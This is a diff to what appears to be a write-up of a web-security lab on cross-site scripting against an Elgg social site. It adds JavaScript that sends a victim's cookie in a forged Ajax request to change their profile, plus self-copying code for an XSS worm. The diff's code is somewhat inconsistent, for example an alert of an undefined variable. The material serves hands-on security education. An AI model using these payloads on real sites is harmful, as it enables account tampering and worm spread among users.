@@ -85,6 +85,7 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: keep-alive
 ```
+
 ---
 
 ## Task 4 : session hijacking using the stolen cookies
@@ -197,7 +198,6 @@ window.onload = function(){
     var content = "My new profile text.";
 
     //Create and send Ajax request to modify profile
-    Ajax = null;
     Ajax = new XMLHttpRequest();
     Ajax.open("POST", sendurl, true);
     Ajax.setRequestHeader("Host", "www.web.com");
@@ -206,6 +206,17 @@ window.onload = function(){
     Ajax.setRequestHeader("Cookie", document.cookie);
     Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     Ajax.send(content);
+
+    var samyGuid=AAVVXX; //FILL IN
+    if(elgg.session.user.guid!=samyGuid) {
+        //Create and send Ajax request to modify profile
+        var Ajax=null;
+        Ajax=new XMLHttpRequest();
+        Ajax.open("POST",sendurl,true);
+        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+    }
 }
 ```
 
@@ -345,18 +356,22 @@ ff.send(params);
 <script id="worm" type="text/javascript">
     var badCode = document.getElementById("worm");
     alert(badCode.innerHTML);
-    
+</script>
 
-    // innerHTML only gives us the inside part of the code, var copy = document.getElementById("worm").innerHTML;
+<script id="worm" type="text/javascript">
     var header = "<script id=\"worm\" type=\"text/javascript\" >";
+
+    // innerHTML only gives us the inside part of the code, not including the surrounding script tags.
+    var copy = document.getElementById("worm").innerHTML; 
+    
     var tail = "</" + "script>";
     var wormCode = encodeURIComponent(header+copy+tail);
     alert(jsCode);
+</script>
 
-
+<script id="worm" type="text/javascript">
     // construct a copy of itself
     var selfProp = "<script id=\"worm\" type=\"text/javascript\" >".concat( document.getElementById("worm").innerHTML ).concat("</").concat("script>");
-
 </script>
 ```
 
